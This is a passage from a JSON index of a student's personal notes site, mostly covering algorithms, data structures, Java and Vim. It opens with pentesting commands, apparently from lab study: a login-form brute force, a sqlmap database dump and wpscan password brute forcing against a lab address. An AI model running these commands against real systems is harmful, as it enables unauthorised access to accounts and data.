\"/Account/login.aspx?ReturnURL=/admin:__VIEWSTATE=iL08cD6b3clJctyo0KNeEsuXx9w7SrkAtggDy0m16fdgDu1lU1uuo3uh6%2FRluRbkD9GutlhMGTHkzw5TKQ%2BHgSoGVo73vHE7yAY2Vsky3EyktnYS%2BIy0jb68wZvhEHGpOLmwYsk3M7NnT45B%2B2jaDdrRfwr94Ks2d1VIKp2LvcNs%2F6rd\u0026__EVENTVALIDATION=5N%2Bcad1wYajo0H2m7Bq3nlBqYeKcha9MeicRSms1xOrJ8b9v%2FiDF9nj6Kge38NGN6KBMhWEtiNyCZFWTMItDUQu34YiMN8vVxQv6lQEgBw5RWhtEihlALnJsM5gAhf89mlKiwmAbHq2Lz0jR30paNwnGrt5M%2Fwj7m6oohs8%2F8JQKoaoM\u0026ctl00%24MainContent%24LoginUser%24UserName=^USER^\u0026ctl00%24MainContent%24LoginUser%24Password=^PASS^\u0026ctl00%24MainContent%24LoginUser%24LoginButton=Log+in:Login Failed\" -vv\n```\n\n## SQLmap\n```bash\nsqlmap -r request.txt --dbms=mysql --dump\n```\n\n## Wordpress\nEnumeration:\n\n```bash\nwpscan --url 10.10.101.40/blog\n```\n\nLook for vulnerable plugins and usernames:\n\n```bash\nwpscan --url 10.10.101.40/blog --usernames admin --passwords /usr/share/wordlists/rockyou.txt --max-threads 50\n```\n\n## Git\n```bash\n--ff-only\n```\n",
    "lastmodified": "2022-11-24T12:21:01.802312493Z",
    "tags": null
  },
  "/notes/general/vectors-arrays": {
    "title": "Vectors and Arrays",
    "content": "# Vectors and Arrays\n---\n- Vectors are typically 1-d whereas arrays can be multi-dimensional.\n- in **C/C++** they are indexed from zero.\n\nDeclared arrays have *literal* constant size **fixed** at compile time:\n```c\n#define SIZE 42\nint c[SIZE];\n```\n\nWe **cannot** use *const* variables as size:\n```c\nconst int NEW_SIZE = 561\nint c[NEW_SIZE];  /* This is not a literal constant! */\n```\n\nFor **variable size** vectors we use **malloc** and **pointers** (allocated on the heap). However there are some constraints on its use:\n```c\nint func(int n) {\n  int *vec = (int *) malloc (n * sizeof (*vec));\n\n  for(int i=0; i\u003cn; i++) {\n  vec[i] = n; \n  }\n}\n```\n\n```ad-note\nWe can also use **alloca** (allocated on the stack).\n```\n\n## Associative arrays\n- Also known as **addressable arrays** or [maps](notes/general/sets-and-maps.md).\n\nOrdinary arrays/vectors when given an index into the array output a value whereas **associative arrays** when given a value outputs an index.\n\nThey are common in hardware and efficient to implement. However they are harder to implement in software.\n\n## Sparse arrays\nIt is an array of data in which many elements have a value of zero. It can be compressed or truncated to fit storage spaces. For example, rather than holding all of the zero values in variables, the array could simply point to the number of zero values in a sequence or otherwise compress the array's data storage.\n\nIf they are regular (e.g. in numerical analysis), then map mathematically to vector.\n\nIf irregular, use a vector of pointers to sparse rows, represented in compact form (e.g. column/value pairs or linked list).\n\nReference: [Sparse Array - Techopedia](https://www.techopedia.com/definition/9480/sparse-array)",
    "lastmodified": "2022-11-24T12:21:01.818728089Z",
    "tags": null
  },
  "/notes/general/vim-cheatsheet": {
    "title": "Vim Cheatsheet",
    "content": "# Vim Cheatsheet\n\nThankfully I remember most of these but all of them are great :)\n\n* **MD to PDF** and **MD to HTML** are custom.\n\n**Shortcut** | **Function**\n-------- | --------\n`g` + `t` | Next tab\n`g` + `T` | Previous tab\n`z` + `z` | Center on this line\n`Ctrl` + `[`, `Ctrl` + `]` | Previous or next tab\n`Ctrl` + `w` + `s` | Horizontal split\n`Ctrl` + `w` + `v` | Vertical split\n`Ctrl` + `w` + `q` | Close \n`Ctrl` + `w` + `w` | Switch splits \n`Ctrl` + `j`, `h`, `k`, `l` | Move around\n`\u003cleader\u003e` + `N` | Toggle number\n`\u003cleader\u003e` + `r` | Shortcut to replace, press * on word then type replacement\n`\u003cleader\u003e` + `p` + `p` | MD to PDF\n`\u003cleader\u003e` + `p` + `h` | MD to HTML \n\n## How to macro\n\nTo enter a macro, type: `q\u003cletter\u003e\u003ccommands\u003eq`\n\nTo execute the macro **number** of times (once by default), type:\n`\u003cnumber\u003e@\u003cletter\u003e`\n\nSo, the complete process looks like:\n\nCommand | What happens\n------- | ------------\n`qd` | start recording to register\n`...` | your complex series of commands\n`q` | stop recording\n`@d` | execute your macro\n`@@` | execute your macro again\n\n ## Insert text into multiple lines at once\n Press `Ctrl + v` to enter into visual block mode.\n\nUse `↑` / `↓` / `j` / `k` to select multiple lines.\n\nPress `Shift + i` and start typing what you want.\n\nAfter you press `Esc`, the text will be inserted into all the lines you selected.\n\n## Plugins\n### Telescope\n**Shortcut** | **Function**\n-------- | --------\n`leader` + `f` + `f` | Find files\n`leader` + `f` + `g` | Live grep\n`leader` + `f` + `k` | List key-maps and search\n`Ctrl` + `x` | Open in vertical split\n`Ctrl` + `v` | Open in horizontal split\n\n### FzF\n| Shortcut   | Function                 |\n| ---------- | ------------------------ |\n| `:Files`     | Search files.            |\n| `:GFiles?`    | Git files (`git status`).  | \n| `:Buffers`   | Open buffers.            | \n\n### LSP\n| Shortcut                             | Function                   |\n| ------------------------------------ | -------------------------- |\n| `g` + `l`                            | Check message on the side. |\n| `g` + `D`                            | Go to declaration.         |\n| `g` + `d`                            | Go to definition.          |\n| `K`                                  | Hover message.             |\n| `g` + `r`                            | Goto references.           |\n| `:lua vim.lsp.buf.formatting_sync()` | Format code.               |\n",
    "lastmodified": "2022-11-24T12:21:01.836995602Z",
    "tags": null
  },
  "/notes/images/github-actions.png": {
    "title": "",
    "content": "",
    "lastmodified": "2022-11-24T12:21:01.952646255Z",
    "tags": null
  },
  "/notes/university/alg-foundation-analysis": {
    "title": "Foundation of Algorithm Analysis",
    "content": "# Foundation of Algorithm Analysis\n\n- Running time.\n- Pseudo-code.\n- Counting primitive operations.\n\n## Running Time\nVaries with the input and typically grows with the input size.\n\nAn algorithm may run faster on certain data set compared to others.\n\nWe have the following run times:\n- Best case.\n    - Not very informative as it might not happen very often.\n- Worst case.\n    - Easier to analyse, crucial to applications such as traffic control etc.\n- Average case.\n    - Take all inputs, calculate time for all inputs then sum all calculated values and divide by total inputs.\n\nWe can use `System.currentTimeMillis()` for example to get a measure of running time in Java.\n\n### Limitations\n- We would need same software and hardware environments.\n- Sometimes difficult to implement algorithm.\n- One algorithm can perform better than the rest for some inputs.\n\nThe solution is **asymptotic analysis**.\n\n### Asymptotic Analysis\nIt uses a high-level description of the algorithm instead of an implementation.\n\nWe evaluate the performance of an algorithm in terms of input size and calculate how does the time taken by an algorithm increases with the input size.\n\n## T(n)\nWe use it to measure the running time/computation of an algorithm.\n\nWhere **n** is the size of the input, if there is more than one input we might have T(n,m) where **n** and **m** are the sizes of the inputs.\n\nWe can use T(n) to calculate the **[Big O](notes/general/big-o-notation.md)**.\n\n## Pseudo-Code\n![Screenshot 2022-09-03 at 22.19.59](notes/images/Screenshot%202022-09-03%20at%2022.19.59.png)\n\nWe do not call functions unless we describe the pseudo-code for them or describe what they do.\n\nFor example, we would not say:\n\n```\nX = Y.toLowerCase();\n```\n\nHowever we could say:\n\n```\nLet X equal the lower case version of Y\n```\n\n### Variables\n![Screenshot 2022-09-03 at 22.22.12](notes/images/Screenshot%202022-09-03%20at%2022.22.12.png)\n\n### If Statements\n![Screenshot 2022-09-03 at 22.22.27](notes/images/Screenshot%202022-09-03%20at%2022.22.27.png)\n\n### For Loops\n![Screenshot 2022-09-03 at 22.22.39](notes/images/Screenshot%202022-09-03%20at%2022.22.39.png)\n\n### Full Example\n![Screenshot 2022-09-03 at 22.22.56](notes/images/Screenshot%202022-09-03%20at%2022.22.56.png)\n\n## Primitive Operations\nThey are basic computations performed by an algorithm, for example:\n\n- Evaluating an expression (x\u003ey)\n- Assigning a value to a variable.\n- Indexing into an array.\n- Calling a method.\n- Returning from a method.\n\n![Screenshot 2022-09-03 at 22.25.34](notes/images/Screenshot%202022-09-03%20at%2022.25.34.png)\n\nThe most difficult part is getting all of the nest loops correct.\n\n![Screenshot 2022-09-03 at 22.34.28](notes/images/Screenshot%202022-09-03%20at%2022.34.28.png)\n\n![Screenshot 2022-09-03 at 22.43.31](notes/images/Screenshot%202022-09-03%20at%2022.43.31.png)\n\n![Screenshot 2022-09-03 at 22.45.28](notes/images/Screenshot%202022-09-03%20at%2022.45.28.png)\n\n- Normally **if statements** have 9 primitive operations.\n\n![Screenshot 2022-09-03 at 22.46.31](notes/images/Screenshot%202022-09-03%20at%2022.46.31.png)",
    "lastmodified": "2022-11-24T12:21:03.472002625Z",
    "tags": null
  },
  "/notes/university/alg-intro": {
    "title": "Introduction to Algorithms",
    "content": "# Introduction to Algorithms\nAn algorithm is a set of steps for solving a problem. It is a well-defined computational procedure that takes some value(s) as input and produces some value(s) as output.\n\nThey can be seen as a tool for solving well-specified **computational problems**.\n\nWe have algorithms because while computers are getting faster, they are not infinitely fast.\n\n```toc\n```\n\n## Analysis of an Algorithm\nIndication of the time a computer will take to solve a problem given the size of the problem. Without analysis we do not know how long they'll take.\n\nTime is abstract, it is usually measured in operations. This is also known as the **computational complexity** of an algorithm.\n\n## Example\nFor the **fake coin** problem, we can either compare each coin and get a liner big O or we could use **binary search** (by splitting in half, comparing, then splitting in half again etc) to get a complexity of **O(log N)**. The worst case being log2(N+1) comparisons. log2(64) = 6.\n\n![Pasted image 20220826212941](notes/images/Pasted%20image%2020220826212941.png)\n\n## Module Overview\n- Concepts of algorithms:\n    - What is an algorithm?\n    - What is the analysis of algorithms?\n    - Computational Complexity\n\n- Concepts of Data Structure:\n    - Notation, list, queues, trees, graphs, hash tables, etc.\n\n- A number of different algorithms:\n    - Sorting, searching, graph traversal, heuristic search, evolutionary computation, data clustering, bin packing, optimisation.\n\n- A number of different applications:\n    - Examples of searching, graph based problems, based packing problems, data clustering gene expression data, parameter optimisation and the travelling salesperson problem.\n\n## Supplementary Materials\n### Where did it all start?\n- In ~1900, German mathematician **David Hilbert** listed 23 unsolved mathematical problems.\n- He refined to 10 problems to ask if:\n    - \"Is there a way of determining if an arbitrary first-order symbolic logic statement is true or false?\"\n\nThis became known as the **Decision Problem** (very hard name in German), a.k.a the **[halting problem](notes/general/halting-problem.md)**.\n\nBriefly, the halting problem means: can we find a program that can predict whether any other program and its input will halt or run forever.\n\n**[Alan Turing](notes/general/alan-turing.md)** proved that is is **impossible** to solve the halting problem - which was used to show that the **decision** problem was impossible to solve.\n\nIn 1936 Turing created two concepts: **[turing machine](notes/general/turing-machines.md)** and **universal turing machine**.\n\nIn 1939 Turing created a machine called \"The Bombe\" which helped crack the German enigma code. \n\nIn 1948, the first computer (Baby) and associated computer program were developed at Manchester University based on Turing's ideas.\n\n## Computer Science and Computation\n- Discipline that studies computable problems and computational structures.\n- Involves the understanding and design of computers and computational processes.\n- Interdisciplinary.\n\nComputation is the procedure of calculating, determining something by mathematical or logical methods.\n\n**Computability** is about what computers can and cannot do.\n\n### What is a Computer and a Computer program?\nA **computer** is a device for carrying out certain types of algorithms.\n\n**Algorithms** are a set of steps for solving a problem.\n\nA **computer programming language** describes algorithms to computers, and a **computer program** is a description of a single algorithms and/or problem (usually).\n\n**Computer software** is a collection of programs that carry out a similar or related task.\n\n## Next Lecture\n- [Foundation Analysis](notes/university/alg-foundation-analysis.md)",
    "lastmodified": "2022-11-24T12:21:03.661996603Z",
    "tags": null
  },
  "/notes/university/arrays": {
    "title": "Arrays",
    "content": "# Arrays\n---\nSimplest and most widely used data structure, which **maintains the insertion order of  elements**.\n\nElements are **indexed**, meaning the [big-O](notes/general/big-o-notation.md) for searching for an index is **O(1)**.\n\nIt is of fixed-size and can hold a collection of similar items.\n\n`ArrayList` however allows for dynamic size, it is a variable length Collection class.",
    "lastmodified": "2022-11-24T12:21:03.682849288Z",
    "tags": null
  },
  "/notes/university/best-first-search": {
    "title": "Best-First Search",
    "content": "# Best-First Search\nIt is an improvement upon [depth-first search](notes/university/depth-first-search.md).\n\nA heuristic is used to decide which node is explored next:\n- A **heuristic** is a rule of thumb or best practice.\n\nFor example, nodes are expanded in order of lowest cost.\n\n## A* Search\nVery good for route finding applications:\n- The AA website.\n- The tube.\n\nIt needs **two estimates**:\n- How much a partial path has cost.\n- An estimate (**under estimate**) of how far is left to the goal state, for example lower bound on how far to travel.\n\nIt will find an optimal path without necessarily considering all the routes.\n\nIt scores each partial path with the function $f = g + h$, where $g$ is the **cost so far** and $h$ is the **estimate of the cost to the goal state**.\n- London to Manchester: Land transport 200.21 miles, crow-flies 163.05 miles.\n\nIf $h$ is always zero (we don't have any information about how far away the goal is), then the algorithm becomes similar to [depth-first search](notes/university/depth-first-search.md).\n\nIf $g$ is always zero, then the algorithm is called **Greedy Search**.\n- Making locally optimal choices at each stage with the hope of finding the global optimum.\n\n### Example\n![Screenshot 2022-11-07 at 11.41.25](notes/images/Screenshot%202022-11-07%20at%2011.41.25.png)",
    "lastmodified": "2022-11-24T12:21:03.715972424Z",
    "tags": null
  },
  "/notes/university/breadth-first-search": {
    "title": "Breadth-First Search",
    "content": "# Breadth-First Search\nIt explores the graph differently from [depth-first search](notes/university/depth-first-search.md).\n\nIt considers the **neighbouring** nodes first:\n- All the neighbours at the start node are expanded first.\n- Then the neighbours of the neighbours.\n- Until the goal state is found.\n\nIt is a very expensive search since all the partial paths being considered must be stored.\n\nIt will eventually find a path to the goal but it may not be the best path.\n\nIt is similar to the [exhaustive search](notes/university/exhaustive-search.md) but it stops when the goal node is reached.\n\n![400](notes/images/Screenshot%202022-11-07%20at%2011.32.54.png)\n\n## Visualisation\nBreadth-First Search: [https://www.cs.usfca.edu/~galles/visualization/BFS.html](https://www.cs.usfca.edu/~galles/visualization/BFS.html)",
    "lastmodified": "2022-11-24T12:21:03.697018385Z",
    "tags": null
  },
  "/notes/university/classes-types-objects": {
    "title": "Classes, Types and Objects",
    "content": "# Classes, Types and Objects\nNotes from \"Data Structures and Algorithms in Java by Michael T. Goodrich\".\n\n```toc\n```\n\n![Pasted image 20220814184657](notes/images/Pasted%20image%2020220814184657.png)\n\n**Objects** store data and provide methods for accessing and modifying data. Every **object** is an instance of a **class**, which defines the **type** of the object and the kind of operations it performs. The **members** of a class are:\n    - Data of objects are stored in **instance variables** (aka **fields**).\n    - Operations can act on data, **methods**.\n\n## Class Modifiers\nAccess control modifiers, meaning they control the level of access (visibility) that the defining class grants to other classes.\n\nThe ability to limit access among classes -\u003e encapsulation.\n\n### Public\nAll classes may access the defined aspect. For example:\n\n```java\npublic class Counter {\n```\n\nAll other classes, such as CounterDemo, are allowed to construct new instances of the Counter class, as well as to declare variables and parameters of type Counter.\n\nEach **public class** must be defined in **a separate file**, class name = `classname.java`.\n\nThe designation of **public** access for a particular method of a class allows any other class to make a call to that method. For example:\n\n```java\npublic int getCount() {\n    return count;\n}\n```\n\nThe CounterDemo class may call `c.getCount()`.\n\nTherefore, if an instance variable is declared as public, dot notation can be used to directly access the variable by code in any other class that possesses a reference to an instance of this class. For example, if Counter is public, CounterDemo would be allowed to read or modify that variable using syntax such as `c.count`.\n\n### Protected\nAccess is only granted to the following groups of other classes:\n\n- **Subclasses** through inheritance.\n- Classes that belong to the same **package**.\n\n### Private\nAccess is only granted within that class, neither subclass nor any other classes have access to such members.\n\nFor example, we defined the count instance variable of the Counter class to have private access level. We were allowed to read or edit its value from within methods of that class (such as getCount, increment, and reset), but other classes such as CounterDemo cannot directly access that field. \n\nOf course, we did provide other public methods to grant outside classes with behaviours that depended on the current count value.\n\n### No control modifier\nThen we default to **package-private** access level.\n\n### Static\nThe class' value is associated with the class as a whole, rather than with each individual instance of that class.\n\nStatic variables are used to store **\"global\"** information about a class. For example, to maintain the total number of instances of that class that have been created. Static variables exist even if no instance of their class exists.\n\nBeing static is **associated with the class itself, and not with a particular instance of the class**. This means that the method is not invoked on a particular instance of the class using the traditional dot notation, instead it uses the name of the class as a qualifier.\n\nFor example, the `java.lang` package has a Math class that provides many static methods, including `sqrt`, square root. To compute a square root, you do not need to create an instance of the Math class, you use `Math.sqrt(2)` for example, with the class name Math as the qualifier before the dot operator.\n\n\"Static methods can be useful for providing utility behaviours related to a class that need not rely on the state of any particular instance of that class.\"\n\n### Abstract\nAny subclass of a class with abstract methods is expect to provide a concrete implementation for each abstract method.\n\nAbstract methods are an advanced feature of object-oriented programming to be combined with inheritance.\n\nA class with one or more abstract methods must also be formally declared as **abstract**, because it is incomplete. As a result, Java won't allow any instances of an abstract class to be constructed, although reference variables may be declared with an abstract type.\n\n### Final\nA variable declared with final can be initialised but can never again be assigned a new value. If it is a base type, then it is a constant. If a reference is final, then it will always refer to the same object. If a member variable of a class is declared as final, it will typically be declared as **static** as well, because it would be unnecessarily wasteful to have every instance store the identical value when that value can be shared by the entire class.\n\nA final method cannot be overridden by a subclass, and a final class cannot even be subclassed.\n\n## Primitive Types (Base Types)\n- Boolean: true or false.\n- Char: 16-bit Unicode character.\n- Byte: 8-bit signed two's complement integer.\n- Short: 16-bit two's complement integer.\n- Int: 32-bit two's complement integer.\n- Long: 64-bit two's complement integer.\n- Float: 32-bit floating-point number.\n- Double: 64-bit floating-point number.\n\nFloating-points constants, like 3.1415, are of type **double** unless followed by an 'F' or 'f'.\n\n```java\npublic class Primitive_Types {\n    public static void main (String[] args) {\n        boolean flag = true;\n        char ch = 'A';\n        byte b = 12;\n        short s = 23;\n        int i = 341;\n        long l = 561L;\n        float f = 3.1415F;\n        double d = 6.4231;\n\n        System.out.println(\"flag = \" + flag);\n        System.out.println(\"ch = \" + ch);\n        System.out.println(\"b = \" + b);\n        System.out.println(\"s = \" + s);\n        System.out.println(\"i = \" + i);\n        System.out.println(\"l = \" + l);\n        System.out.println(\"f = \" + f);\n        System.out.println(\"d = \" + d);\n    }\n}\n```\n\n## Objects\nNew objects are created by using the **new** operator. It creates a new object and returns a **reference** to that object. We must immediately follow our use of the **new** operator by a call to a constructor for that type of object.\n\n![Pasted image 20220814190529](notes/images/Pasted%20image%2020220814190529.png)\n\nThree events occur:\n\n1. New object is dynamically allocated in memory and all instance variables are initialised to standard default values. Default is **null** for object variables and 0 for all base types except **boolean** which is false.\n2. Constructor is called with the parameters specified. It fills in meaningful values for the instance variables and performs any additional computations to create the object.\n3. After constructor returns, the **new** operator returns a reference (memory address) to the newly created object.\n\n## Dot Operator\nEvery object reference variable must refer to some object, unless it is **null**. \n\nAn object can have many references pointing to it, the same one. One of the main uses of an object reference variable is to access the members of the class for this object, for example methods. This access is performed with the dot operator.\n\nA method's name, number and types of parameters is called a method's **signature**. For example:\n\n```java\noven.cookDinner();\noven.cookDinner(food);\noven.cookDinner(food, seasoning);\n```\nEach of these methods calls is referring to a different method with the same name defined in the class that oven belongs to. \n\nThe signature of a method in Java **does not** include the type that the method returns, meaning Java doesn't allow two methods with the same signature to return different types.\n\n## Variable Modifiers\nThe **scope** can be controlled by the following variable modifiers:\n\n1. **public**: anyone can access it.\n2. **protected**: only methods of the same package or of its sub classes can access it.\n3. **private**: only methods of the same class can access it.\n4. If none used then it is **friendly**, meaning anyone in the same package can access.\n\n**Usage modifiers**:\n1. **static**: variable is associated with the class, not with the individual instances of that class. They store **global** information about a class.\n2. **final**: must be assigned an initial value and then can never be assigned a new value after that.\n\n![Pasted image 20220814192407](notes/images/Pasted%20image%2020220814192407.png)\n\n## Enum Types\nEnumerated types. Only allowed to take on values that come from a specified set of names declared inside a class as follows:\n\n```java\nmodifier enum name { val_name0, val_name1, ..., val_namen-1};\n```\n\nwhere the modifier can be blank, public, protected or private. Another example:\n\n```java\npublic enum Day { MON, TUE, WED, THU, FRI, SAT, SUN };\n```\n\n![Pasted image 20220814192633](notes/images/Pasted%20image%2020220814192633.png)\n\n## Return Types\nIf the method doesn't return a value, then we use **void**. If the return type is void, the method is called a **procedure**.\n\n## Parameters\nThey are passed **by value**, meaning that any time we pass a parameter to a method, a copy of that parameter is made for use within the method body. So if we pass an **int** to a method, then that variable's integer value is copied. The method can change the copy but not the original. If we pass an object by reference as a parameter to a method, then the reference is copied as well.\n\n## Constructor\nSpecial kind of method that is used to initialise a newly created instance of the class so that it will be in a consistent and stable initial state. The general syntax is:\n\n```java\nmodifiers name(type, parameter) {\n    // constructor body...\n}\n```\n\n```java\npublic fish (int w, String n) {\n    weight = w;\n    name = n;\n}\n```\n\n1. Constructors cannot be **static**, **abstract** or **final**. Only public, protected, private or default.\n2. The name of the constructor must be identical to the name of the class it constructs. For example, when defining the Counter class, a constructor must be named Counter as well.\n3. We don't specify a **return type** for a constructor, not even **void**. Nor does the body of a constructor explicitly return anything.\n\nA class can have many constructors, but each must have a different **signature**, meaning each must be distinguished by the type and number of the parameters it takes.\n\nConstructors **must** be called using the **new** operator. For example:\n\n```java\nFish myFish = new Fish(8, \"Bob\");\n```\n\nAs an example, our Counter class defines the following pair of constructors: \n\n```java\npublic Counter() { }  \npublic Counter(int initial) { count = initial; }\n```\n\nThe first of these has a trivial body, { }, as the goal for this default constructor is to create a counter with value zero, and that is already the default value of the integer instance variable, count. \n\nHowever, it is still important that we declared such an explicit constructor, because otherwise none would have been provided, given the existence of the non-default constructor. In that scenario, a user would have been unable to use the syntax, `new Counter()`.\n\n## This\nWithin the body of a (non-static) method in Java, the keyword this is automatically defined as a reference to the instance upon which the method was invoked. \n\nThat is, if a caller uses a syntax such as `thing.foo(a, b, c)`, then within the body of method foo for that call, the keyword this refers to the object known as thing in the caller’s context.\n\nWhy we need it from within a method body:\n\n1. To store the reference in a variable, or send it as a parameter to another method that expects an instance of that type as an argument.\n\n## Arrays\n(Page 60)",
    "lastmodified": "2022-11-24T12:21:03.86867547Z",
    "tags": null
  },
  "/notes/university/cs2001": {
    "title": "CS2001 - Group Project",
    "content": "# CS2001\n---\n**Lecturer**: Nadine Aburumman\n\n100% Coursework.\n\n- [Introduction](notes/university/group-project-intro-gp20.md)",
    "lastmodified": "2022-11-24T12:21:05.189326286Z",
    "tags": null
  },
  "/notes/university/cs2002": {
    "title": "CS2002 - Software Development",
    "content": "# CS2002\n---\n**Lecturer**: Giuseppe Destefanis\n\n50% Coursework (LO1 and LO2) -\u003e Due on the 20th of January.\n\n50% Exam.\n\n### Lectures\n- [UML - Class Diagram](notes/university/uml-class-diagram.md) (Week 2 and 3)\n- [UML Sequence Diagram](notes/university/uml-sequence-diagram.md) (Week 4 and 5)\n- [State Machine Diagrams (Part 1)](notes/university/state-machine-diagrams-part1.md) (Week 8)\n- [State Machine Diagrams (Part 2)](notes/university/state-machine-diagrams-part2.md) (Week 9)\n\n### References\n- [UML @ Classroom - Chapter 3 (Use Case Diagram)](notes/university/uml-classroom-chap3.md) (Week 1)",
    "lastmodified": "2022-11-24T12:21:05.199943185Z",
    "tags": null
  },
  "/notes/university/cs2003": {
    "title": "CS2003 - Usability Engineering",
    "content": "# CS2003 - Usability Engineering\n---\n**Lecturer**: Monica Pereira\n\n### Lectures\n- Week 5 - [User Models and Conceptual Design](notes/university/user-models-and-conceptual-design.md)\n- Week 6 - [User-Centred Design](notes/university/user-centred-design.md)\n- Week 8 - [Specifying User Requirements](notes/university/specifying-user-requirements.md)\n\n100% Exam.",
    "lastmodified": "2022-11-24T12:21:05.219401121Z",
    "tags": null
  },
  "/notes/university/cs2004": {
    "title": "CS2004 - Algorithms",
    "content": "# CS2004 - Algorithms\n---\n**Lecturer**: Mahir Arzoky\n\n60% Coursework -\u003e Due on Friday, Week 21.\n\n40% Exam -\u003e Available on Week 23.\n\n### Lectures\n- [Introduction](notes/university/alg-intro.md)\n- [Foundation Analysis](notes/university/alg-foundation-analysis.md)\n- [Data Structures and Applications](notes/university/data-structures.md)\n- [Sorting](notes/general/sorting.md)\n- [Graph Traversal](notes/general/graphs.md)\n\n### References\n- [Classes, Types, and Objects](notes/university/classes-types-objects.md)\n- [Big O Notation](notes/general/big-o-notation.md)\n- [Sets and Maps](notes/general/sets-and-maps.md)\n- [Trees](notes/general/trees.md)",
    "lastmodified": "2022-11-24T12:21:05.339260459Z",
    "tags": null
  },
  "/notes/university/cs2005": {
    "title": "CS2005 - Networks and Operating Systems",
    "content": "# CS2005 - Networks and Operating Systems\n---\n**Lecturer**: Anastasia Anagnostou\n\n25% Coursework -\u003e Due on the 06 of December.\n\n75% Exam.\n\n### Lab Notes\n```dataview\nLIST from #cs2005/lab \n```",
    "lastmodified": "2022-11-24T12:21:05.321854591Z",
    "tags": null
  },
  "/notes/university/data-structures": {
    "title": "CS2004 - Data Structures",
    "content": "# CS2004 - Data Structures\nData structures are the foundation stone of all algorithms.\n\nWe can measure how good a particular data structure is by using [big-O notation](notes/general/big-o-notation.md).\n\n- [Lists](notes/general/lists.md)\n- [Graphs](notes/general/graphs.md)",
    "lastmodified": "2022-11-24T12:21:03.901485443Z",
    "tags": null
  },
  "/notes/university/depth-first-search": {
    "title": "Depth-First Search",
    "content": "# Depth-First Search\nIt allows us to explore nodes and edges of a [|graph](notes/general/graphs.md).\n\nThe traversal will go as far as possible down a path until a **dead end** is reached.\n\nIn an [](notes/general/graphs.md#Undirected%7Cundirected) graph:\n- A node is a dead end if all of the nodes adjacent to it have already been visited.\n\nIn an [](notes/general/graphs.md#Directed%7Cdirected) graph:\n- A node is a dead end if it has no outgoing edges and we visited everything else.\n\n### Undirected Graph\n![400](notes/images/Screenshot%202022-11-07%20at%2009.58.41.png)\n\n![400](notes/images/Screenshot%202022-11-07%20at%2009.58.55.png)\n\n![400](notes/images/Screenshot%202022-11-07%20at%2010.00.55.png)\n\n### Directed Graphs\n![400](notes/images/Screenshot%202022-11-07%20at%2010.01.48.png)\n\n## Steps\n1. Visit the starting node and then proceed to follow links through the graph until a dead end is reached.\n2. Back up along our path until we find an unvisited adjacent node, and continue in that new direction.\n3. The process completes when we back up to the starting node and all the nodes adjacent to it have been visited.\n4. If presented with two choices, we choose the node with numerically and/or alphabetically smaller label (for convenience).\n\n## Pseudo-Code\n```\nAlgorithm 1. DFS(G,n)  \nInput: G- the graph  \nn- the current node  \n1) Visit(n) [Do something to/at node n...]  \n2) Mark(n)  \n3) For every edge nm (from n to m) in G do  \n4) If m is not marked then  \n5) DFS(G,m)  \n6) End If  \n7) End For  \nOutput: Depends on the purpose of the search...\n```\n\n## Running Time\nDFS is called on each node exactly once, $n$ nodes: $O(n)$.\n\nEvery edge is examined exactly twice, once from each of its vertices/nodes - $m$ edges: $O(2m)$.\n\nTherefore, $O(n) + O(2m) \\equiv O(n+m)$.\n\nIf we assume that the work done as we visit each node is the most complex part of the process, the traversal is of order $O(n)$.\n\n## Visualisation\nDepth-First Search: [https://www.cs.usfca.edu/~galles/visualization/DFS.html](https://www.cs.usfca.edu/~galles/visualization/DFS.html)",
    "lastmodified": "2022-11-24T12:21:03.915084958Z",
    "tags": null
  },
  "/notes/university/exhaustive-search": {
    "title": "Exhaustive Search",
    "content": "# Exhaustive Search\nIt systematically evaluates every possible path in a [graph](notes/general/graphs.md). It is guaranteed to find what we are looking for, however it is **unsuitable** for most real world problems.\n\n## Pseudo-Code\n```\nAlgorithm 2. Exhaustive(G, n, p)  \nInput: G- the graph  \nn- the current node  \np– the path so far  \n1) For every edge nm (from n to m) in G do  \n2) If m  p then  \n3) p = p  {m}  \n4) Exhaustive(G, m, p)  \n5) End If  \n6) End For  \nOutput: Depends on the purpose of the search...\n```\n\n## Running Time\nIt depends on how the nodes and edges are organised.\n\nFor the worst case we would get:\n\n$(n-1)(n-2)(n-3)...1 = O((n-1)!)$.",
    "lastmodified": "2022-11-24T12:21:03.950021267Z",
    "tags": null
  },
  "/notes/university/group-project-intro-gp20": {
    "title": "Introduction",
    "content": "# Introduction to the Module\nThe theme of the project will be based on the [UN Sustainable Development Goals](https://www.un.org/sustainabledevelopment/).\n\n![Screenshot 2022-09-19 at 14.25.54](notes/images/Screenshot%202022-09-19%20at%2014.25.54.png)\n\nIt will be a **full-stack web application with a server backend, pulling and pushing data from and to a data source. It will expose a [REST API](notes/university/rest-api.md) to a front-end client.**\n\nWe will use **[Scrum](notes/university/scrum.md)**, and have two leads emulating Product Owner and Scrum Master.\n\n## Learning Outcomes\n1. Plan, manage and track a substantial group activity.\n2. Take an open-ended problem, collect and analyse relevant information and define and refine the requirements.\n3. Independently and systematically design, develop and test a piece of software that is data-driven and has non-trivial functionality.\n4. Compare and evaluate alternative problem solutions according to given criteria, including from a technical perspective.\n5. Effectively present, communicate and market ideas and solutions to different audiences.  \n6. Understand and apply the principles of professional and ethical behaviour in a group context.\n7. Reflect and learn from the group project experience.\n\n## Recommended Tools\n- Project management: Excel or JIRA.\n- Ideation: PowerPoint, Miro, Business Model Canvas/Lean Canvas.\n- Design: Visual Paradigm, empathy maps, customer journeys, UML class diagrams, ER diagrams.\n- Software Development and Testing: \n    - IDE: Eclipse Web Developer Tools for CSS/HTML/JS support or Visual Studio Code.\n    - Backend: Java Spring Boot Framework.\n    - Database: MySQL.\n    - Front-end: React.js Framework.\n    - Testing: Java Unit testing, PostMan for API testing.",
    "lastmodified": "2022-11-24T12:21:03.969844937Z",
    "tags": null
  },
  "/notes/university/linked-list": {
    "title": "Linked List",
    "content": "# Linked List\n---\nIt maintains the insertion order of elements, however they are **not** indexed. When searching, we start with the head and work our way through.\n\nThe complexity ([big-O](notes/general/big-o-notation.md)) of finding a value is of **O(n)**. The best and worst of insertion/deletion are **0(1)** for best and **O(n)** for worst.",
    "lastmodified": "2022-11-24T12:21:04.066482425Z",
    "tags": null
  },
  "/notes/university/queue": {
    "title": "Queue",
